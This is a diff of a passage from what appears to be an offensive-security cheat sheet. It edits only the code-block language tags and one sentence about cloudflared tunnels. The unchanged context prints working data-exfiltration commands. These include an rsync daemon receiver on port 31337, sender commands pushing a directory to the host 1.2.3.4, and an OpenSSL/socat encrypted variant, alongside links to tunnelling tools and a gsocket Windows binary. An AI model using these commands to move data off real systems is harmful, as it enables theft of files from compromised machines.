@@ -957,21 +957,21 @@ A list of our [favorite public upload sites](#cloudexfil).
 Ideal for synchonizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
 
 Receiver:
-```
+```posh
 echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
 mkdir upload
 rsync --daemon --port=31337 --config=r.conf --no-detach
 ```
 
 Sender:
-```
+```posh
 rsync -av warez rsync://1.2.3.4:31337/up
 ```
 
 The same encrypted (OpenSSL):
 
 Receiver:
-```
+```posh
 openssl req -subj '/CN=thc/O=EXFIL/C=XX' -new -newkey rsa:2048 -sha256 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
 cat ssl.key ssl.crt >ssl.pem
 rm -f ssl.key
@@ -980,7 +980,7 @@ socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.crt EXEC:"rsyn
 ```
 
 Sender:
-```
+```posh
 # Copy the ssl.pem and ssl.crt from the Receiver to the Sender:
 # Using rsync + socat-ssl
 rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.crt,verify=0' #" -- warez  0:
@@ -989,7 +989,7 @@ rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,caf
 rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername thc -cert ssl.pem -CAfile ssl.crt -quiet 2>/dev/null' #" -- warez  0:
 ```
 
-This can be combined with cloudflared to exfil with [rsync over https / cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
+Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
 (To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
 
 <a id="webdav"></a>
